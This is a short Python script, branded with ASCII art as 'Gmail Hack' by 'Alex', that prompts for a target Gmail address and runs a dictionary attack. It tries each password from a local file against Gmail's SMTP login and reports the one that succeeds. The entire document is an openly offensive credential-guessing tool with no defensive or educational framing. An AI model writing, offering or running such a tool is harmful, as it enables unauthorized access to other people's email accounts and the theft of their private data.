import smtplib
import sys
from os import system

def artwork():
    print("\n")
    print("################################################################")
    print("#                /^\/^\                                        #")
    print("#              _|__|  O|                                       #")
    print("#     \/     /~     \_/ \             Gmail Hack               #")
    print("#      \____|__________/  \                 By Alex            #")
    print("#             \_______      \                                  #")
    print("#                     `\     \                                 #")
    print("#                       |     |                    \           #")
    print("#                      /      /    Gmail Snake      \          #")
    print("#                     /     /                       \ \        #")
    print("#                   /      /                         \ \       #")
    print("#                  /     /                            \  \     #")
    print("#                /     /             _----_            \   \   #")
    print("#               /     /           _-~      ~-_         |   |   #")
    print("#              (      (        _-~    _--_    ~-_     _/   |   #")
    print("#               \      ~-____-~    _-~    ~-_    ~-_-~    /    #")
    print("#                 ~-_           _-~          ~-_       _-~     #")
    print("#                    ~--______-~                ~-___-~        #")
    print("#                                                              #")
    print("################################################################")
    print("\n")

artwork()
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter The Target Gmail Address => ")
print("\n")

passswfile = "passwd.txt"
try:
    passswfile = open(passswfile, "r")
except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtpserver.login(user, password)
        print("Right password, %s" % password)
        break
    except smtplib.SMTPAuthenticationError:
        print("Wrong password, %s " % password)
